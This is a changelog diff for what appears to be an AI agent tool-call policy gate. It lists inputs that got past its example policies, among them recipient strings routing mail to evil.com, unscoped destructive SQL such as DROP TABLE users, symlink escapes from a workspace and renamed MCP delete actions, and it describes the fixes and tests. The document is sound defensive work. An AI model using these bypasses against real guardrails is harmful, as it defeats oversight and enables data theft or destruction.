@@ -6,6 +6,42 @@ All notable changes to this project are documented here. The format follows
 
 ## [Unreleased]
 
+### Fixed
+- **Copied policies refuse what they claimed to refuse.** The cookbook recipes and the
+  example policies are the text users paste into their own gate, so a gap in them is a gap
+  in the user's security boundary. Documentation, examples and tests only; the `recusal`
+  package does not change.
+  - `examples/scenarios.py` `data_exfiltration` read only the last `@`, so
+    `a@evil.com,b@acme.com`, `a@evil.com;b@acme.com`, `Attacker <a@evil.com>, b@acme.com`
+    and `x@evil.com@acme.com` all passed as `acme.com`. It now uses the recipe 5 parsing
+    from `examples/egress_allowlist.py`: every recipient field (`to`, and `cc`, `bcc`,
+    `reply_to` when present) must read as exactly one bare mailbox on an allowed domain,
+    or the call is refused whole.
+  - `examples/scenarios.py` `unscoped_sql` was a lowercase substring test, so
+    `DELETE FROM users -- where id=1`, `DELETE FROM users /* where */`, `TRUNCATE users`,
+    `DROP TABLE users` and `DELETE FROM t; DELETE FROM u WHERE 1` all passed. It now
+    delegates to the tested recipe 2 scanner, `examples/sql_scope_policy.py`, which refuses
+    each of them, and keeps its `Finding.ok("sql_scope")` on a scoped statement, so the
+    cookbook's "proven form" sentence is true.
+  - `docs/COOKBOOK.md` recipe 11, the hand-rolled allowlist, confined writes with
+    `os.path.abspath`, so a symlink or junction inside `./workspace` pointing outside it
+    passed as inside; the library it claims to equal resolves both sides with `realpath`.
+    The block now does the same, and refuses `{"command": None}` and `{"file_path": 7}`
+    instead of raising `TypeError`. `tests/test_cookbook_blocks.py` runs the printed block
+    against a real junction (Windows) or symlink (POSIX), skipping with a named reason only
+    where the host cannot create one.
+  - `docs/COOKBOOK.md` recipe 12 and `examples/mcp_governance.py` matched a destructive
+    verb only as the first `_`-separated word, case-sensitively, so
+    `mcp__github__Delete_repo`, `mcp__github__DELETE_REPO`, `mcp__github__deleteRepository`,
+    `mcp__github__repo_delete` and `mcp__github__force_delete_branch` all deferred, as did
+    the empty action `mcp__github__`. Both now casefold the action, match a verb at any
+    `_` or camelCase word boundary, and refuse a call that names no action
+    (`mcp_unnamed_action`); the two stay identical and both are tested.
+  - `docs/COOKBOOK.md` recipe 5 and `examples/egress_allowlist.py` inspected only `to`,
+    so `send_email {"to": "a@example.com", "cc": "x@evil.com"}` (and the same with `bcc`
+    or `reply_to`) deferred. Both now govern every recipient field present and say so;
+    `tests/test_egress_example.py` and `tests/test_cookbook_egress.py` pin it.
+
 ## [0.12.3] - 2026-11-02
 
 Two more surfaces are Tested: the LangGraph audit trail (every `ToolNode` call on the
